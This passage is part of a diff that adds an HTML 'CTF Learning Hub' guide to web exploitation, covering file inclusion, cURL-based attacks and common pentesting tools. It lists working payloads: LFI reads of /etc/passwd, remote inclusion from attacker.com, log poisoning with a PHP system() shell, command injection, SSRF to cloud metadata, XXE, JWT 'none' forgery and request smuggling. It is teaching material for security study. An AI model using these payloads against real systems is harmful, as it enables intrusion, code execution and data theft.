+include('/var/www/html/' . $page . '.php');
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Local File Inclusion (LFI)</h3>
+                        <div class="code-block">
+# Basic LFI
+http://vulnerable.com/index.php?page=../../../../etc/passwd
+
+# Using PHP wrappers
+http://vulnerable.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+
+# Using /proc/self/environ
+http://vulnerable.com/index.php?page=../../../../proc/self/environ
+
+# Using PHP expect wrapper (if enabled)
+http://vulnerable.com/index.php?page=expect://ls
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Remote File Inclusion (RFI)</h3>
+                        <div class="code-block">
+# Basic RFI
+http://vulnerable.com/index.php?page=http://attacker.com/shell.txt
+
+# With PHP code execution
+http://vulnerable.com/index.php?page=http://attacker.com/shell.txt?&cmd=id
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>LFI to RCE Techniques</h3>
+                        <div class="code-block">
+# Log poisoning
+nc -nv vulnerable.com 80
+GET /<?php system($_GET['cmd']); ?> HTTP/1.1
+Host: vulnerable.com
+
+Then access:
+http://vulnerable.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
+
+# PHP session file inclusion
+http://vulnerable.com/index.php?page=../../../../var/lib/php/sessions/sess_[sessionid]
+
+# Using /proc/self/fd/ (when file upload is available)
+1. Upload a file containing PHP code
+2. Include it via /proc/self/fd/[FD_NUMBER]
+                        </div>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>File Inclusion Tools</h3>
+                        <p><span class="tool-name">LFISuite</span> - Automatic LFI Exploiter</p>
+                        <div class="tool-details" id="lfisuite-details">
+                            <div class="code-block">
+# Basic usage
+python lfisuite.py -u "http://example.com/index.php?page=" --method log
+                            </div>
+                            <div class="linux-option" data-target="lfisuite-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="lfisuite-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="lfisuite-kali">
+                                <div class="code-block">
+# Kali Linux installation
+git clone https://github.com/D35m0nd142/LFISuite
+cd LFISuite
+pip install -r requirements.txt
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="lfisuite-manual">
+                                <div class="code-block">
+# Manual installation
+git clone https://github.com/D35m0nd142/LFISuite
+cd LFISuite
+pip install -r requirements.txt
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> For file inclusion challenges:
+                        <ul>
+                            <li>Try common files: <span class="flag-format">/etc/passwd</span>, <span class="flag-format">/proc/self/environ</span></li>
+                            <li>Use PHP wrappers: <span class="flag-format">php://filter/convert.base64-encode/resource=index.php</span></li>
+                            <li>Check for log poisoning possibilities</li>
+                            <li>Try null byte termination if PHP version is old</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <section id="curl">
+            <div class="card">
+                <h2>cURL Exploitation</h2>
+                <div class="vuln-section">
+                    <p>cURL is a powerful command-line tool for transferring data with URLs. It can be used to test and exploit web vulnerabilities.</p>
+
+                    <div class="sub-topic">
+                        <h3>Basic cURL Usage</h3>
+                        <div class="curl-examples">
+                            <p><span class="http-method">GET</span> request:</p>
+                            <div class="code-block">
+curl http://example.com
+                            </div>
+                            
+                            <p><span class="http-method">POST</span> request:</p>
+                            <div class="code-block">
+curl -X POST -d "username=admin&password=pass" http://example.com/login
+                            </div>
+                            
+                            <p>With <span class="http-method">headers</span>:</p>
+                            <div class="code-block">
+curl -H "User-Agent: Mozilla" -H "Accept: application/json" http://example.com
+                            </div>
+                            
+                            <p>With <span class="http-method">cookies</span>:</p>
+                            <div class="code-block">
+curl -b "session=abc123" http://example.com/dashboard
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="sub-topic">
+                        <h3>Exploiting Vulnerabilities with cURL</h3>
+                        <div class="curl-examples">
+                            <p>Testing for <span class="http-method">SQL Injection</span>:</p>
+                            <div class="code-block">
+curl -X POST -d "username=admin'--&password=any" http://example.com/login
+                            </div>
+                            
+                            <p>Testing for <span class="http-method">Command Injection</span>:</p>
+                            <div class="code-block">
+curl "http://example.com/ping?ip=127.0.0.1;whoami"
+                            </div>
+                            
+                            <p>Testing for <span class="http-method">SSRF</span>:</p>
+                            <div class="code-block">
+curl "http://example.com/load?url=http://169.254.169.254/latest/meta-data/"
+                            </div>
+                            
+                            <p>Testing for <span class="http-method">LFI</span>:</p>
+                            <div class="code-block">
+curl "http://example.com/view?file=../../../../etc/passwd"
+                            </div>
+                        </div>
+                        <div class="show-more" data-target="curl-more">Show more cURL exploitation examples</div>
+                        <div class="more-payloads" id="curl-more">
+                            <div class="curl-examples">
+                                <p>Bypassing <span class="http-method">authentication</span>:</p>
+                                <div class="code-block">
+curl -X POST -d "username=admin&password[$ne]=1" http://example.com/login
+                                </div>
+                                
+                                <p>Exploiting <span class="http-method">JWT tokens</span>:</p>
+                                <div class="code-block">
+curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." http://example.com/admin
+                                </div>
+                                
+                                <p>Testing for <span class="http-method">XXE</span>:</p>
+                                <div class="code-block">
+curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>' http://example.com/xml
+                                </div>
+                                
+                                <p>Exploiting <span class="http-method">HTTP Request Smuggling</span>:</p>
+                                <div class="code-block">
+curl -X POST -H "Transfer-Encoding: chunked" -H "Content-Length: 4" -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n" http://example.com
+                                </div>
+                                
+                                <p>Testing for <span class="http-method">Open Redirect</span>:</p>
+                                <div class="code-block">
+curl -v "http://example.com/redirect?url=http://evil.com"
+                                </div>
+                                
+                                <p>Testing for <span class="http-method">CRLF Injection</span>:</p>
+                                <div class="code-block">
+curl -H "User-Agent: Mozilla\r\nX-Injected: header" http://example.com
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="sub-topic">
+                        <h3>Advanced cURL Techniques</h3>
+                        <div class="curl-examples">
+                            <p>Following <span class="http-method">redirects</span>:</p>
+                            <div class="code-block">
+curl -L http://example.com
+                            </div>
+                            
+                            <p>Saving <span class="http-method">cookies</span> and reusing them:</p>
+                            <div class="code-block">
+# Save cookies
+curl -c cookies.txt http://example.com/login
+# Use cookies
+curl -b cookies.txt http://example.com/admin
+                            </div>
+                            
+                            <p>Testing for <span class="http-method">CRLF Injection</span>:</p>
+                            <div class="code-block">
+curl -H "User-Agent: Mozilla\r\nX-Injected: header" http://example.com
+                            </div>
+                            
+                            <p>Testing for <span class="http-method">Open Redirect</span>:</p>
+                            <div class="code-block">
+curl -v "http://example.com/redirect?url=http://evil.com"
+                            </div>
+                            
+                            <p>Using <span class="http-method">proxy</span>:</p>
+                            <div class="code-block">
+curl -x http://127.0.0.1:8080 http://example.com
+                            </div>
+                            
+                            <p>Verbose <span class="http-method">output</span>:</p>
+                            <div class="code-block">
+curl -v http://example.com
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="tool">
+                        <h3>cURL Installation</h3>
+                        <p><span class="tool-name">cURL</span> - Command line tool and library</p>
+                        <div class="tool-details" id="curl-details">
+                            <div class="linux-option" data-target="curl-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="curl-blackarch">BlackArch</div>
+                            <div class="linux-option" data-target="curl-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="curl-kali">
+                                <div class="code-block">
+# Kali Linux comes with cURL pre-installed
+curl --version
+
+# If not installed:
+sudo apt update && sudo apt install curl
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="curl-blackarch">
+                                <div class="code-block">
+# BlackArch has cURL in its repositories
+sudo pacman -S curl
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="curl-manual">
+                                <div class="code-block">
+# Download and compile from source
+wget https://curl.se/download/curl-7.80.0.tar.gz
+tar -xvf curl-7.80.0.tar.gz
+cd curl-7.80.0
+./configure
+make
+sudo make install
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> cURL is invaluable for CTFs because:
+                        <ul>
+                            <li>It can automate exploitation of web vulnerabilities</li>
+                            <li>Use <span class="flag-format">-v</span> flag to see full request/response</li>
+                            <li>Chain with tools like <span class="flag-format">grep</span> to find flags</li>
+                            <li>Use <span class="flag-format">-L</span> to follow redirects automatically</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="tools">
+            <div class="card">
+                <h2>Essential Web Exploitation Tools</h2>
+                <div class="vuln-section">
+                    <div class="tool">
+                        <h3>Burp Suite</h3>
+                        <p><span class="tool-name">Burp Suite</span> - Web vulnerability scanner and proxy tool</p>
+                        <div class="tool-details" id="burp-details">
+                            <div class="code-block">
+# Community Edition is free
+# Download from https://portswigger.net/burp/communitydownload
+
+# Run with Java
+java -jar burpsuite_community.jar
+                            </div>
+                            <div class="linux-option" data-target="burp-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="burp-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="burp-kali">
+                                <div class="code-block">
+# Kali Linux comes with Burp Suite pre-installed
+burpsuite
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="burp-manual">
+                                <div class="code-block">
+# Download from official site
+wget https://portswigger.net/burp/releases/download?product=community&version=2021.10.3&type=jar -O burpsuite.jar
+java -jar burpsuite.jar
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>OWASP ZAP</h3>
+                        <p><span class="tool-name">OWASP ZAP</span> - Open source web application security scanner</p>
+                        <div class="tool-details" id="zap-details">
+                            <div class="code-block">
+# Features include:
+- Automated scanner
+- Manual testing tools
+- REST API for automation
+- Support for authentication
+                            </div>
+                            <div class="linux-option" data-target="zap-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="zap-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="zap-kali">
+                                <div class="code-block">
+# Install on Kali
+sudo apt update && sudo apt install zaproxy
+
+# Run ZAP
+zaproxy
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="zap-manual">
+                                <div class="code-block">
+# Download from official site
+wget https://github.com/zaproxy/zaproxy/releases/download/v2.11.1/ZAP_2.11.1_Linux.tar.gz
+tar -xvf ZAP_2.11.1_Linux.tar.gz
+cd ZAP_2.11.1
+./zap.sh
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>Other Useful Tools</h3>
+                        <p><span class="tool-name">Nikto</span> - Web server scanner</p>
+                        <div class="tool-details" id="nikto-details">
+                            <div class="code-block">
+# Basic scan
+nikto -h http://example.com
+                            </div>
+                            <div class="linux-option" data-target="nikto-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="nikto-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="nikto-kali">
+                                <div class="code-block">
+# Install on Kali
+sudo apt update && sudo apt install nikto
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="nikto-manual">
+                                <div class="code-block">
+# Manual installation
+git clone https://github.com/sullo/nikto
+cd nikto/program
+perl nikto.pl -h http://example.com
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <p><span class="tool-name">Dirb</span> - Directory brute-forcing tool</p>
+                        <div class="tool-details" id="dirb-details">
+                            <div class="code-block">
+# Basic usage
+dirb http://example.com /usr/share/wordlists/dirb/common.txt
+                            </div>
+                            <div class="linux-option" data-target="dirb-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="dirb-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="dirb-kali">
+                                <div class="code-block">
+# Install on Kali
+sudo apt update && sudo apt install dirb
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="dirb-manual">
+                                <div class="code-block">
+# Manual installation
+wget https://sourceforge.net/projects/dirb/files/dirb/2.22/dirb222.tar.gz
+tar -xvf dirb222.tar.gz
+cd dirb222
+./configure
+make
+sudo make install
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <p><span class="tool-name">Wfuzz</span> - Web application fuzzer</p>
+                        <div class="tool-details" id="wfuzz-details">
+                            <div class="code-block">
+# Basic usage
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://example.com/FUZZ
+                            </div>
+                            <div class="linux-option" data-target="wfuzz-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="wfuzz-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="wfuzz-kali">
+                                <div class="code-block">
+# Install on Kali
+sudo apt update && sudo apt install wfuzz
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="wfuzz-manual">
+                                <div class="code-block">
+# Manual installation
+pip install wfuzz
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <section id="ctf-tips">
+            <div class="card">
+                <h2>CTF Web Exploitation Tips</h2>
+                <div class="vuln-section">
+                    <div class="sub-topic">
+                        <h3>General CTF Strategy</h3>
+                        <ul>
+                            <li>Always view the page source (Ctrl+U or Right-click → View Page Source)</li>
+                            <li>Check for hidden comments in HTML: <span class="flag-format">&lt;!-- secret: flag{...} --&gt;</span></li>
+                            <li>Inspect HTTP headers with browser dev tools or <span class="flag-format">curl -v</span></li>
+                            <li>Try common files: <span class="flag-format">/robots.txt</span>, <span class="flag-format">/.git/</span>, <span class="flag-format">/backup.zip</span></li>
+                            <li>Check for disabled JavaScript - some challenges require it to be off</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Flag Formats</h3>
+                        <p>Flags can come in different formats. Common ones include:</p>
+                        <div class="code-block">
+flag{Th1s_1s_4_fl4g}
+FLAG{Th1s_1s_4_fl4g}
+CTF{Th1s_1s_4_fl4g}
+THM{Th1s_1s_4_fl4g}
+HTB{Th1s_1s_4_fl4g}
+[FLAG] Th1s_1s_4_fl4g [/FLAG]
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Common Web CTF Challenges</h3>
+                        <ul>
+                            <li><strong>Simple SQLi</strong>: Try basic SQL injection payloads on login/search forms</li>
+                            <li><strong>XSS Challenges</strong>: Often require stealing admin cookies or executing specific JS</li>
+                            <li><strong>File Upload</strong>: Try uploading PHP shells with different extensions</li>
+                            <li><strong>JWT Tampering</strong>: Change algorithm to "none" or crack weak secrets</li>
+                            <li><strong>Source Code Review</strong>: Check for hardcoded credentials or logic flaws</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Useful Wordlists</h3>
+                        <div class="code-block">
+# Common directories
+/usr/share/wordlists/dirb/common.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+# Common files
+/usr/share/wordlists/dirb/common-files.txt
+
+# RockYou (for passwords)
+/usr/share/wordlists/rockyou.txt
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Quick Checks</h3>
+                        <ul>
+                            <li>Try <span class="flag-format">/admin</span>, <span class="flag-format">/backup</span>, <span class="flag-format">/flag</span> endpoints</li>
+                            <li>Check for <span class="flag-format">.git</span> directory exposure</li>
+                            <li>Try HTTP methods: <span class="flag-format">OPTIONS</span>, <span class="flag-format">PUT</span>, <span class="flag-format">DELETE</span></li>
+                            <li>Test for IDOR by changing numeric IDs in URLs</li>
+                            <li>Check for misconfigured CORS headers</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <p>CTF Learning Hub | Web Exploitation Guide</p>
+            <p>Remember: Always get proper authorization before testing systems.</p>
+        </footer>
+    </div>
+
+    <script>
+        // Toggle sections when clicking headers
+        document.querySelectorAll('h2').forEach(header => {
+            header.addEventListener('click', () => {
+                header.classList.toggle('active');
+                const section = header.nextElementSibling;
+                section.style.display = section.style.display === 'block' ? 'none' : 'block';
+            });
+        });
+
+        // Navigation to sections
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const sectionId = link.getAttribute('data-section');
+                const section = document.getElementById(sectionId);
+                const header = section.querySelector('h2');
+                
+                // Close all sections
+                document.querySelectorAll('.vuln-section').forEach(sec => {
+                    sec.style.display = 'none';
+                });
+                document.querySelectorAll('h2').forEach(h => {
+                    h.classList.remove('active');
+                });
+                
+                // Open selected section
+                header.classList.add('active');
+                header.nextElementSibling.style.display = 'block';
+                section.scrollIntoView({ behavior: 'smooth' });
+            });
+        });
+
+        // Show more payloads
+        document.querySelectorAll('.show-more').forEach(button => {
+            button.addEventListener('click', () => {
+                const targetId = button.getAttribute('data-target');
+                const target = document.getElementById(targetId);
+                target.style.display = target.style.display === 'block' ? 'none' : 'block';
+                button.textContent = target.style.display === 'block' ? 'Show less' : 'Show more';
+            });
+        });
+
+        // Show tool details
+        document.querySelectorAll('.tool-name').forEach(tool => {
+            tool.addEventListener('click', () => {
+                const details = tool.parentNode.nextElementSibling;
+                details.style.display = details.style.display === 'block' ? 'none' : 'block';
+            });
+        });
+
+        // Show Linux installation options
+        document.querySelectorAll('.linux-option').forEach(option => {
+            option.addEventListener('click', () => {
+                const targetId = option.getAttribute('data-target');
+                const parent = option.parentNode;
+                
+                // Hide all installation methods in this tool
+                parent.querySelectorAll('.linux-install').forEach(install => {
+                    install.style.display = 'none';
+                });
+                
+                // Show selected installation method
+                document.getElementById(targetId).style.display = 'block';
+            });
+        });
+
+        // Open first section by default
+        document.querySelector('h2').classList.add('active');
+        document.querySelector('.vuln-section').style.display = 'block';
+    </script>
+</body>
+</html>
